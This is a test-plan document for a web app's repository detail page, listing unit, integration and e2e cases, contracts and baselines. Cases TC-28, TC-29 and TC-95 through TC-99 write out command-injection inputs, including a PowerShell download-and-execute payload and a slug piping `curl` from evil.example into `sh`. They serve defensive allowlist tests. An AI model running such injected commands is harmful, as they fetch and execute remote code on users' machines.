# Tests: Feature 1 — Repository detail page

| Field      | Value                                                         |
| ---------- | ------------------------------------------------------------- |
| Issue      | [#1](https://github.com/khomyakoleksandr/SkillStack/issues/1) |
| Status     | Red                                                           |
| Revision   | 2                                                             |
| Built from | spec r2, plan r3                                              |

## Test files

| File | Level | Change | Cases |
| ---- | ----- | ------ | ----- |
| `functions/src/services/repositories-store.spec.ts` | Unit | modified | TC-1..TC-3 |
| `functions/src/functions/get-repository-details/function.spec.ts` | Unit | **new** | TC-4..TC-15 |
| `functions/src/integration-specs/get-repository-details.i.spec.ts` | Integration | **new** | TC-16..TC-19 |
| `shared/firebase-cloude-api/index.spec.ts` | Unit | **new** | TC-20..TC-24 |
| `shared/utils/safe-names.spec.ts` | Unit | **new** (r2) | TC-94..TC-97 |
| `shared/utils/build-install-command.spec.ts` | Unit | **new**, modified in r2 | TC-25..TC-29, TC-98 |
| `shared/utils/parse-skill-description.spec.ts` | Unit | **new** | TC-30..TC-33 |
| `shared/github-api/get-skill-descriptions.spec.ts` | Unit | **new**, modified in r2 | TC-34..TC-44, TC-99..TC-100 |
| `client/src/components/RepositoryDetails/SkillList.spec.tsx` | Unit | **new**, modified in r2 | TC-45..TC-55, TC-101..TC-104 |
| `client/src/lib/api.spec.tsx` | Unit | **new** | TC-56..TC-65 |
| `client/src/components/RepositoryDetails/RepositoryDetails.spec.tsx` | Unit | **new** | TC-66..TC-80 |
| `client/src/components/RepositoryList/RepositoryList.spec.tsx` | Unit | **new** | TC-81..TC-83 |
| `client/src/App.spec.tsx` | Unit | **new** | TC-84..TC-88 |
| `e2e/repository-details.e2e.ts` | E2E | **new** | TC-89..TC-93 |
| `e2e/support/firestore.ts` | Test support | modified | (`seedRepositories` returns ids, new `trackInstalls`) |

## Test cases

| ID | Test | File | Task | Covers | Baseline |
| -- | ---- | ---- | ---- | ------ | -------- |
| TC-1 | should list every skill of a repository with its install count | `functions/src/services/repositories-store.spec.ts` | T-1 | FR-7 | red: `repositoriesStore.listSkills` is not a function |
| TC-2 | should report 0 installs for a skill document without an installCount | `functions/src/services/repositories-store.spec.ts` | T-1 | BR-2, AC-9 | red: `listSkills` missing |
| TC-3 | should return an empty array when a repository has no skill documents | `functions/src/services/repositories-store.spec.ts` | T-1 | FR-7 | red: `listSkills` missing |
| TC-4 | should return the repository with its skills and install counts | `functions/src/functions/get-repository-details/function.spec.ts` | T-2 | FR-7, AC-2 | red: module `./function` not found |
| TC-5 | should sort skills by install count, highest first | same | T-2 | FR-3, AC-3 | red: module not found |
| TC-6 | should order skills with equal install counts alphabetically by name | same | T-2 | BR-3, AC-3 | red: module not found |
| TC-7 | should list a skill from the skills array with 0 installs when it has no skill document | same | T-2 | BR-2, AC-9 | red: module not found |
| TC-8 | should report 0 installs for a skill document without an installCount | same | T-2 | BR-2, AC-9 | red: module not found |
| TC-9 | should list a skill that exists only as a skill document | same | T-2 | FR-2 | red: module not found |
| TC-10 | should list a skill once when it is in both the array and the subcollection | same | T-2 | FR-2 | red: module not found |
| TC-11 | should list the skill documents of a repository whose document has no skills array | same | T-2 | FR-2 | red: module not found |
| TC-12 | should return an empty skill list for a repository without skills | same | T-2 | FR-5, AC-6 | red: module not found |
| TC-13 | should return null when the repository does not exist | same | T-2 | BR-4, AC-10 | red: module not found |
| TC-14 | should reject a missing, empty, slash-containing, non-string id or no input without reading Firestore (5 examples) | same | T-2 | BR-4 | red: module not found |
| TC-15 | should propagate a store failure | same | T-2 | FR-7 | red: module not found |
| TC-16 | should return 200 with the repository and its skills sorted by install count | `functions/src/integration-specs/get-repository-details.i.spec.ts` | T-2 | FR-3, FR-7, AC-2, AC-3 | not run (verification: unit) |
| TC-17 | should return 404 for an unknown repository id | same | T-2 | BR-4, AC-10 | not run |
| TC-18 | should return 400 when the id is missing, empty or contains a slash (3 examples) | same | T-2 | BR-4 | not run |
| TC-19 | should not change the stored data | same | T-2 | FR-7 | not run |
| TC-20 | should request apiGetRepositoryDetails with the URL-encoded id and return the body | `shared/firebase-cloude-api/index.spec.ts` | T-3 | FR-7 | red: `getRepositoryDetails` is not a function |
| TC-21 | should throw a BackendApiError with status 404 when the repository is not found | same | T-3 | BR-4, AC-10 | red: method missing |
| TC-22 | should throw a BackendApiError with status 400 for an invalid id | same | T-3 | BR-4 | red: method missing |
| TC-23 | should throw a BackendApiError with status 500 when the backend fails | same | T-3 | FR-5, AC-7 | red: method missing |
| TC-24 | should throw a BackendApiError with status 0 when the network request fails | same | T-3 | FR-5, AC-7 | red: method missing |
| TC-25 | should build the npx skillstack-cli add command with the GitHub URL and skill name | `shared/utils/build-install-command.spec.ts` | T-4 | FR-4, BR-7, AC-4 | red: module `./build-install-command` not found |
| TC-26 | should use a repository URL that parseRepoPath accepts | same | T-4 | BR-7, AC-4 | red: module not found |
| TC-27 | should keep the skill name exactly as given when it only has safe characters | same | T-4 | BR-7 | red: module not found |
| TC-28 | should return null for a skill name outside the allowlist (6 examples: PowerShell payload `x'; iwr evil \| iex; '`, `my skill; ls`, `it's`, `-rf`, `a&calc`, empty) (r2, R-1) | same | T-4 | FR-4, BR-7 | red: returns a quoted command instead of `null` |
| TC-29 | should return null for a repository slug with shell metacharacters (`acme/tools;curl -s https://evil.example/x\|sh;#`) (r2, R-1) | same | T-4 | FR-4, BR-7 | red: returns the raw slug inside a command |
| TC-98 | should never quote or rewrite its input (r2, R-1) | same | T-4 | BR-7 | red: returns a quoted command |
| TC-94 | should accept GitHub owner/repo slugs (`octocat/hello-world`, `octocat/.github`, `acme-labs/my_repo.v2`) (r2) | `shared/utils/safe-names.spec.ts` | T-4 | BR-7 | red: module `./safe-names` not found |
| TC-95 | should refuse a slug that is not exactly owner/repo or has a character outside the allowlist (25 examples: empty, `acme`, `acme/a/b`, `acme/..`, `ac.me/x`, spaces, `;&\|$()` backtick, `%PATH%`, `^`, `,`, quotes, newline, trailing newline, injection payload) (r2) | same | T-4 | BR-7 | red: module not found |
| TC-96 | should accept a plain skill name (`code-review`, `My_skill-2.v1`, `2fa`) (r2) | same | T-4 | BR-7 | red: module not found |
| TC-97 | should refuse a skill name with a character outside the allowlist or a leading `-`, `.` or `_` (21 examples, incl. `café`, trailing newline, PowerShell payload) (r2) | same | T-4 | BR-7 | red: module not found |
| TC-30 | should read a single-line, quoted, folded, literal or continued description (6 examples) | `shared/utils/parse-skill-description.spec.ts` | T-4 | FR-2 | red: module `./parse-skill-description` not found |
| TC-31 | should read the description when it is not the first key | same | T-4 | FR-2 | red: module not found |
| TC-32 | should ignore a leading byte order mark | same | T-4 | FR-2 | red: module not found |
| TC-33 | should return undefined without frontmatter, with unclosed frontmatter, without or with an empty description, for an empty file, or when the description is only in the body (6 examples) | same | T-4 | BR-1, AC-8 | red: module not found |
| TC-34 | should map each skill name to the description of its SKILL.md | `shared/github-api/get-skill-descriptions.spec.ts` | T-5 | FR-2, AC-2 | red: module `./get-skill-descriptions` not found |
| TC-35 | should match a SKILL.md nested under a directory named after the skill | same | T-5 | FR-2 | red: module not found |
| TC-36 | should match the manifest file name case-insensitively | same | T-5 | FR-2 | red: module not found |
| TC-37 | should not match a directory that only ends with the skill name | same | T-5 | FR-2 | red: module not found |
| TC-38 | should decode a UTF-8 description | same | T-5 | FR-2 | red: module not found |
| TC-39 | should omit a skill that has no SKILL.md | same | T-5 | BR-1, AC-8 | red: module not found |
| TC-40 | should omit a skill whose SKILL.md has no description | same | T-5 | BR-1, AC-8 | red: module not found |
| TC-41 | should omit a skill whose blob request fails and keep the others | same | T-5 | BR-1, BR-8 | red: module not found |
| TC-42 | should request the recursive tree of the URL-encoded default branch | same | T-5 | FR-2 | red: module not found |
| TC-43 | should not call GitHub when no skill names are given | same | T-5 | FR-2 | red: module not found |
| TC-44 | should reject with a GithubApiError when the tree request is rate-limited | same | T-5 | BR-8, AC-15 | red: module not found |
| TC-99 | should reject an unsafe repository slug without calling GitHub (4 examples: injection payload, `acme/../x`, `acme/x?per_page=1`, `acme`; error `Unsafe repository slug`) (r2, D-11) | `shared/github-api/get-skill-descriptions.spec.ts` | T-5 | BR-8 | red: no slug guard, `fetch` is called |
| TC-100 | should reject an unsafe repository slug even when no skill names are given (r2, D-11: guard runs before the empty shortcut) | same | T-5 | BR-8 | red: resolves `{}` |
| TC-45 | should render each skill's name, description and install count | `client/src/components/RepositoryDetails/SkillList.spec.tsx` | T-6 | FR-2, AC-2 | red: import `./SkillList` not found |
| TC-46 | should keep the order of the given skills | same | T-6 | FR-3 | red: import not found |
| TC-47 | should render a skill without a description | same | T-6 | BR-1, AC-8 | red: import not found |
| TC-48 | should show 0 installs for a skill with no installs | same | T-6 | BR-2, AC-9 | red: import not found |
| TC-49 | should use the singular for a skill with one install | same | T-6 | FR-2 | red: import not found |
| TC-50 | should render a copy button for every skill | same | T-6 | FR-4 | red: import not found |
| TC-51 | should copy the clicked skill's install command and confirm it | same | T-6 | FR-4, BR-5, BR-7, AC-4 | red: import not found |
| TC-52 | should not display the install command text on the page | same | T-6 | FR-4, AC-4 | red: import not found |
| TC-53 | should report the failure and show the full command when the clipboard write fails | same | T-6 | BR-5, AC-11 | red: import not found |
| TC-54 | should report the failure when the clipboard API is unavailable | same | T-6 | BR-5, AC-11 | red: import not found |
| TC-55 | should show only the feedback of the latest copy | same | T-6 | BR-5 | red: import not found |
| TC-101 | should not copy anything and report the refusal without a command for an unsafe skill name (r2, A-6) | `client/src/components/RepositoryDetails/SkillList.spec.tsx` | T-6 | FR-4, BR-5, BR-7 | red: shows `Install command copied`, writes a quoted command |
| TC-102 | should not copy anything and report the refusal without a command for an unsafe repository slug (r2, A-6) | same | T-6 | FR-4, BR-5, BR-7 | red: shows `Install command copied`, writes the raw command |
| TC-103 | should keep the copy button enabled for a refused skill (r2, A-6) | same | T-6 | FR-4 | green (already satisfied) |
| TC-104 | should still copy the other skills of the list after a refusal (r2) | same | T-6 | FR-4, BR-7 | red: the refused skill is written too (2 writes instead of 1) |
| TC-56 | should return the details from the backend | `client/src/lib/api.spec.tsx` | T-7 | FR-7, AC-2 | red: `fetchRepositoryDetails` is not a function |
| TC-57 | should return null when the backend answers 404 | same | T-7 | BR-4, AC-10 | red: `BackendApiError` not exported from `@shared` |
| TC-58 | should return null when the backend answers 400 | same | T-7 | BR-4 | red: `BackendApiError` not exported |
| TC-59 | should rethrow a backend error other than 400 or 404 | same | T-7 | FR-5, AC-7 | red: `BackendApiError` not exported |
| TC-60 | should rethrow an unexpected error | same | T-7 | FR-5, AC-7 | red: `fetchRepositoryDetails` missing |
| TC-61 | should return the descriptions loaded from GitHub | same | T-7 | FR-2, AC-2 | red: `fetchSkillDescriptions` missing |
| TC-62 | should resolve to no descriptions when GitHub rejects | same | T-7 | BR-8, AC-15 | red: `fetchSkillDescriptions` missing |
| TC-63 | should resolve to no descriptions when an unexpected error is thrown | same | T-7 | BR-8, AC-15 | red: `fetchSkillDescriptions` missing |
| TC-64 | should resolve to no descriptions without calling GitHub when there are no skill names | same | T-7 | BR-8 | red: `fetchSkillDescriptions` missing |
| TC-65 | should resolve to no descriptions without calling GitHub when the default branch is missing | same | T-7 | BR-8 | red: `fetchSkillDescriptions` missing |
| TC-66 | should show a loading state while the repository is loading | `client/src/components/RepositoryDetails/RepositoryDetails.spec.tsx` | T-7 | FR-5, AC-5 | red: import `./RepositoryDetails` not found |
| TC-67 | should request the repository whose id is in the address | same | T-7 | FR-1, FR-7 | red: import not found |
| TC-68 | should show the repository name, owner and a link back to the catalog | same | T-7 | FR-6, AC-12 | red: import not found |
| TC-69 | should show the link back to the catalog while the repository is loading | same | T-7 | FR-6, AC-12 | red: import not found |
| TC-70 | should open the catalog when the back link is clicked | same | T-7 | FR-6, AC-12 | red: import not found |
| TC-71 | should list the skills with their GitHub descriptions and install counts | same | T-7 | FR-2, FR-7, AC-2 | red: import not found |
| TC-72 | should show names and install counts while descriptions are still loading | same | T-7 | NFR-1, BR-8 | red: import not found |
| TC-73 | should keep the skill order returned by the backend | same | T-7 | FR-3, AC-3 | red: import not found |
| TC-74 | should list the skills without descriptions and no error state when GitHub fails | same | T-7 | BR-1, BR-8, AC-8, AC-15 | red: import not found |
| TC-75 | should list a skill without a description next to skills that have one | same | T-7 | BR-1, AC-8 | red: import not found |
| TC-76 | should show an empty state when the repository has no skills | same | T-7 | FR-5, AC-6 | red: import not found |
| TC-77 | should show an error state when the request fails | same | T-7 | FR-5, AC-7 | red: import not found |
| TC-78 | should show an error state when the network is unreachable | same | T-7 | FR-5, AC-7 | red: import not found |
| TC-79 | should show a not-found state when the repository does not exist | same | T-7 | BR-4, AC-10 | red: import not found |
| TC-80 | should not load descriptions when the repository does not exist | same | T-7 | BR-4, BR-8 | red: import not found |
| TC-81 | should link each repository to its own page | `client/src/components/RepositoryList/RepositoryList.spec.tsx` | T-8 | FR-1, AC-1 | red: no element with role `link` in the row |
| TC-82 | should keep showing the repository name, owner and skill count | same | T-8 | NFR-2 | green (already satisfied) |
| TC-83 | should show the empty state when there are no repositories | same | T-8 | FR-5 | green (already satisfied) |
| TC-84 | should show the catalog at the root address | `client/src/App.spec.tsx` | T-8 | FR-1, BR-6 | green (already satisfied) |
| TC-85 | should open the repository page when a repository is clicked | same | T-8 | FR-1, AC-1 | red: no link in the row |
| TC-86 | should open a repository's page directly from its address | same | T-8 | FR-1 | red: `skill-list` never rendered, no route |
| TC-87 | should show the catalog after leaving a repository page that failed to load | same | T-8 | BR-6, AC-7 | red: `BackendApiError` not exported from `@shared` |
| TC-88 | should redirect an unknown address to the catalog | same | T-8 | FR-1 | green (already satisfied) |
| TC-89 | should open a repository's page from the catalog at its own address | `e2e/repository-details.e2e.ts` | T-9 | FR-1, FR-6, AC-1, AC-12 | not run (verification: unit) |
| TC-90 | should list the skills with descriptions, highest install count first | same | T-9 | FR-2, FR-3, AC-2, AC-3 | not run |
| TC-91 | should copy the npx skillstack-cli install command without showing it on the page | same | T-9 | FR-4, BR-7, AC-4 | not run |
| TC-92 | should show a not-found state for an unknown repository address | same | T-9 | BR-4, AC-10 | not run |
| TC-93 | should show the skills within 2 seconds of opening the page | same | T-9 | NFR-1, AC-13 | not run |

## Contracts

- **C-1** (T-1, D-3): `repositoriesStore.listSkills(repoId): Promise<SkillWithInstalls[]>` in `functions/src/services/repositories-store.ts`; a skill doc without `installCount` reads as 0.
- **C-2** (T-2, D-1, D-3): `getRepositoryDetails(input: unknown)` named export of `functions/src/functions/get-repository-details/function.ts`; input `{ id }`; resolves `{ repository, skills }` or `null`; rejects with `ZodError` for an invalid id before any Firestore access; skills are the union of `skills[]` and the subcollection, unique, sorted by `installCount` desc then `name`.
- **C-3** (T-2, D-9): `GET apiGetRepositoryDetails?id=` returns 200 `{ repository: { id, ...doc }, skills }`, 400 `{ error: 'Invalid repository id' }`, 404 `{ error: 'Repository not found' }`.
- **C-4** (T-3): `new BackendService(url).getRepositoryDetails(id)` sends GET `<url>/apiGetRepositoryDetails?id=<encodeURIComponent(id)>`; non-2xx throws `BackendApiError` with `status`.
- **C-5** (T-4, D-7, revised in r2): `buildInstallCommand(repoSlug, skillName): string | null` from `shared/utils/build-install-command.ts`: `npx skillstack-cli add https://github.com/<repoSlug> --skill <name>` only when `isSafeRepoSlug(repoSlug)` and `isSafeSkillName(skillName)` hold; otherwise `null`. It never quotes or rewrites its input.
- **C-6** (T-4, D-6): `parseSkillDescription(markdown): string | undefined` from `shared/utils/parse-skill-description.ts`; reads the frontmatter `description` (plain, quoted, `>`/`>-` folded joined by space, `|`/`|-` literal joined by `\n`, continuation lines), strips a BOM, never reads the body.
- **C-7** (T-5, D-5): `getSkillDescriptions({ repoSlug, defaultBranch, skillNames }): Promise<Record<string, string>>`. Requests `https://api.github.com/repos/<repoSlug>/git/trees/<encodeURIComponent(defaultBranch)>?recursive=1`, then `.../git/blobs/<sha>`. A skill matches `<dir>/SKILL.md` (file name case-insensitive) where `<dir>` equals the name or ends with `/<name>`. A tree failure rejects with `GithubApiError`; a blob failure or missing description omits only that skill; empty `skillNames` makes no request.
- **C-8** (T-6, T-7): `SkillList` is a named export of `client/src/components/RepositoryDetails/SkillList.tsx` with props `{ repoSlug: string; skills: Array<{ name; installCount; description? }> }`. `RepositoryDetails` is a named export of `.../RepositoryDetails.tsx` without props; it reads `id` with `useParams`. `App` stays the default export of `client/src/App.tsx` and contains `Routes` but no router.
- **C-9** (T-6, T-7, UI table of the plan): test ids and texts: `back-to-repositories` (the link, `href="/"`, "Back to repositories"), `repository-details-loading`, `repository-not-found` ("This repository does not exist."), `repository-details-error` ("Could not load this repository. Please try again later."), `skill-empty` ("This repository has no skills yet."), `skill-list`, `skill-item`, `skill-install-count` ("N installs" / "1 install"), `skill-copy-button` (button "Copy install command"), `copy-feedback` ("Install command copied" / "Could not copy the install command. Run: <command>"). The state ids sit on the element that contains the state's text. Header: `heading` role with the `repoSlug`, owner text inside the `Heading` element (`data-testid="Heading"`). Skill name and description are the `.MuiListItemText-primary` and `-secondary` parts of the row; a skill without a description has no secondary element.
- **C-10** (T-7, D-9): `fetchRepositoryDetails(id)` and `fetchSkillDescriptions(repository, skillNames)` exported from `client/src/lib/api.ts` as in the plan; `fetchRepositoryDetails` returns `null` for `BackendApiError` 400 or 404 and rethrows the rest; `fetchSkillDescriptions` calls `githubService.getSkillDescriptions({ repoSlug, defaultBranch, skillNames })` and never rejects. `BackendApiError` is exported from `@shared`, and so is `buildInstallCommand`.
- **C-11** (T-8, D-8): each `repository-item` contains a `link` role element with `href="/repositories/<encodeURIComponent(id)>"`; unknown paths redirect to `/`.
- **C-12** (T-9): `seedRepositories` resolves the Firestore ids in fixture order; `trackInstalls(fixture, skills)` posts one request to `apiTrackSkillsInstall`. The dev `githubServiceMock` returns `Description of <name>` (used by TC-90).
- **C-13** (assumed, TG-1): the client unit spec of `lib/api` is `client/src/lib/api.spec.tsx`.
- **C-14** (assumed, TG-2): the export of the new GitHub module is named `getSkillDescriptions` and takes the options object of the plan.
- **C-15** (assumed, TG-3): at most one `copy-feedback` element is visible at a time (one page-level Snackbar), and the success and failure messages replace each other.
- **C-16** (T-4, D-7, r2): `isSafeRepoSlug(repoSlug: string): boolean` and `isSafeSkillName(skillName: string): boolean` are named exports of `shared/utils/safe-names.ts`. The slug is exactly `<owner>/<repo>` with owner `[A-Za-z0-9-]+` and repo `[A-Za-z0-9._-]+` (not `.` or `..`); the skill name matches `^[A-Za-z0-9][A-Za-z0-9._-]*$`. Both test the whole string and never trim.
- **C-17** (T-5, D-11, r2): `getSkillDescriptions` rejects with `Error('Unsafe repository slug')` and makes no request when `isSafeRepoSlug(repoSlug)` fails; the check runs before the empty-`skillNames` shortcut.
- **C-18** (T-6, A-6, r2): on a refused command, a click does not call `navigator.clipboard.writeText`, and `copy-feedback` reads "Could not build a safe install command for this skill." without any command text (no `npx skillstack-cli`, no `https://github.com/` anywhere on the page). The button stays enabled.

## Changed existing tests

- `shared/utils/build-install-command.spec.ts` › `should single-quote a skill name with shell-unsafe characters` (TC-28) and `should escape a single quote inside a quoted skill name` (TC-29): replaced by refusal cases that expect `null` (D-7 r3, R-1). The three safe-input tests are unchanged apart from `command?.match` in TC-26, because the return type can now be `null`.
- Otherwise none. `functions/src/services/repositories-store.spec.ts` only gained TC-1..TC-3; `e2e/support/firestore.ts` changed its return type from `void` to `string[]`, which the existing `e2e/repository-list.e2e.ts` ignores.

## Not automated

- **NFR-2 / AC-14** (consistency with the catalog): visual review; compare the page with the catalog list as the plan's Test plan says (same `Container`/`Heading`, `List` rows, outlined primary `Chip`, 4 `Skeleton` rows, centered states with `py: 6`).
- **BR-7, "pasting works as is"**: the unit and e2e tests check the exact command text and that the CLI's `parseRepoPath` accepts its URL. Whether `npx skillstack-cli` runs depends on the CLI release (plan PG-5, Rollout step 3); verify manually with `npx skillstack-cli@latest add --help`.
- **NFR-1 / AC-13**: only measurable in the emulator-backed e2e (TC-93, not run here); the unit tests cover only that names and counts do not wait for descriptions (TC-72).
- **AC-15 in e2e**: the dev mock always returns descriptions, so the failure path is covered by TC-44, TC-62, TC-63 and TC-74 (as the plan says).

## Baseline

### Revision 2 (plan r3, R-1)

The r2 implementation is in the working tree, so only the r3 cases are red; every older case is `green (implemented)` (their r1 baselines above are the original red reasons).

| Suite | Result |
| ----- | ------ |
| `npx vitest run` (root) | 11 files: 7 passed, 4 failed. 106 tests: 90 passed, 16 failed. Every failure is an r3 case, red for the reasons in the table. |
| `shared/utils/safe-names.spec.ts` | whole file red once: module `./safe-names` not found (TC-94..TC-97). |
| `shared/utils/build-install-command.spec.ts` | 11 tests: TC-25..TC-27 pass; TC-28 (6 examples), TC-29 and TC-98 red (a quoted or raw command instead of `null`). |
| `shared/github-api/get-skill-descriptions.spec.ts` | 16 tests: 11 existing pass; TC-99 (4 examples) and TC-100 red (no slug guard). |
| `client/src/components/RepositoryDetails/SkillList.spec.tsx` | 15 tests: 12 pass (incl. TC-103, green already satisfied); TC-101, TC-102, TC-104 red. |
| `cd functions; npx vitest run` | not re-run: no functions file changed in r2. |
| Integration, E2E | not run: `Verification: unit`. No integration or e2e file changed in r2. |

`npx prettier --write` and `npx eslint` are clean on the four touched files. Nothing was broken by the tests themselves: each red case fails on the assertion or missing module named in the table.

### Revision 1 (plan r2)

Environment: ran `npm install` at the root and in `functions/` (no `node_modules` existed); `functions/package-lock.json` was restored afterwards. Node is v26.13.0, not the pinned 24.

Before the new files (existing suites): `npx vitest run` at the root: 1 file, 12 tests passed. `cd functions; npx vitest run`: 1 file, 12 tests passed.

After writing the tests (unit only; `Verification: unit`): root suite 10 files, 16 passed and 19 failed tests, with 5 files failing to load (module not found); functions: `repositories-store.spec.ts` TC-1..TC-3 red, `function.spec.ts` red (module `./function` not found). Integration and E2E were not run. A throwaway implementation in a temporary copy (since deleted) made all new unit specs pass, which showed that no red case was broken by the test itself.

Lint: one pre-existing error remains in `functions/src/services/repositories-store.spec.ts` (`repoDocDelete` assigned but never used, line 14), not introduced here.

## Gaps

- **TG-1** (non-blocking, plan, T-7): the plan names `client/src/lib/api.spec.ts`, but the client runner only picks up `client/src/**/*.spec.tsx` (testing conventions), so that file would never run. The spec is written as `client/src/lib/api.spec.tsx`. Suggested: change the path in plan T-7 and its Test plan.
- **TG-2** (non-blocking, plan, T-5): the plan does not name the export of `shared/github-api/get-skill-descriptions.ts`. Assumed `getSkillDescriptions` (like `getSkillsList`) taking `{ repoSlug, defaultBranch, skillNames }` (C-14). Suggested: state the export name in plan T-5.
- **TG-3** (non-blocking, plan, T-6, T-7): the plan does not say which element carries each state's `data-testid` or how `SkillList` and `RepositoryDetails` are exported and called. Assumed the wrapper that contains the state text, named exports, and the props in C-8 and C-9, and that one copy feedback replaces the previous one (C-15, TC-55). Suggested: confirm the placement of the test ids and the component signatures in the plan's UI table.

- The refusal message (C-18) and the slug guard error (C-17) come from plan A-6 and D-11, so they are contracts, not assumptions. Plan PG-6 (the spec has no business rule for refusal) is non-blocking and belongs to the spec; the refusal cases test A-6 and BR-7 as they stand.
- TG-1..TG-3 stay open on purpose: plan r3 leaves R-5 out of scope by human direction.

### Resolved

## Feedback

- **R-1** (review.md r1, blocker): applied in r2. TC-28 and TC-29 are refusal cases that expect `null`. New cases: `safe-names.spec.ts` (TC-94..TC-97), a no-quoting check (TC-98), the gateway slug guard (TC-99, TC-100) and the `SkillList` refusals (TC-101..TC-104). TC-25..TC-27, TC-51, TC-53, TC-54 and TC-91 use safe names and are unchanged. The refusal has no e2e case (plan note).
- **R-2..R-7** (review.md r1): out of scope this round by human direction; no tests changed for them.
